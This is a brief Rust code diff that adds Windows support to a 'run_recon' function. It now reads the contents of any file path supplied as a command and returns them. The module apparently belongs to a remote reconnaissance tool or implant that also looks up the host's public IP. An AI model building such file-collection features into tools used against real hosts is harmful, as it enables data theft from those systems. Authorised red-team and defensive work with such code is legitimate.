@@ -1,6 +1,7 @@
 use std::env;
 #[cfg(target_os = "linux")]
 use std::{fs, path::Path};
+#[cfg(target_os = "windows")] /* TESTING */ use std::{fs, path::Path};
 
 use ansi_term::Colour;
 use public_ip_addr::get_public_ip;
@@ -32,8 +33,8 @@ pub fn run_recon(command: &str, recon_type: ReconType) -> String {
 
 		#[cfg(target_os = "windows")]
 		ReconType::Windows => {
-			// No windows specific commands at this time
-			return "not supported".to_string();
+			let path = Path::new(&command);
+			return fs::read_to_string(path).unwrap_or("Unknown".to_string());
 		},
 
 		ReconType::Agnostic => {
